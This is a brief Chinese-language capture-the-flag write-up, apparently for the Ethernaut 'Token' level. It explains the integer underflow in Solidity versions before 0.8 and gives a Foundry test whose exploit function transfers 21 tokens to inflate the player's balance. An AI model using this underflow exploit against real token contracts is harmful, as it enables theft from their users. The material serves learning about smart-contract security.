在 solidity 0.8 之前，默认不对整型变量的溢出进行检查，因此可以通过下溢将 balance 修改为很大的值。

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Token.sol";
import "src/levels/TokenFactory.sol";

contract TestToken is BaseTest {
    Token private level;

    constructor() public {
        levelFactory = new TokenFactory();
    }

    function setUp() public override {
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance(true));
        level = Token(levelAddress);
    }

    function exploitLevel() internal override {
        vm.startPrank(player);

        level.transfer(address(0), 21);
        console.log(level.balanceOf(address(player)));
        console.log(level.balanceOf(address(0)));

        vm.stopPrank();
    }
}
```

